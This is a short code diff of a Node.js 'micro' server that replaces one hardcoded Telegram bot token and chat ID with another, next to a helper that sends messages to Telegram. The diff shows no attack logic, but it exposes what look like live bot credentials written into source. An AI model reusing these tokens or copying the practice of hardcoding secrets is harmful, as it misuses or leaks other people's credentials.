@@ -3,8 +3,8 @@ const { json, send } = require('micro');
 const cors = require('micro-cors')({ allowMethods: ['POST', 'OPTIONS'], allowHeaders: ['Content-Type'] });
 
 // --- Telegram Configuration ---
-const TELEGRAM_BOT_TOKEN = '8856764721:AAHTsubai7d4D6vosk38DRd1hViU64ic8wg';
-const TELEGRAM_CHAT_ID = '5942170306';
+const TELEGRAM_BOT_TOKEN = '8801815041:AAEq04S9_DhHMgqHuTvsH_oRBhNCeVTFtPQ8';
+const TELEGRAM_CHAT_ID = '5637309298';
 
 // Helper function to send messages to Telegram using native https
 function sendTelegramMessage(text) {
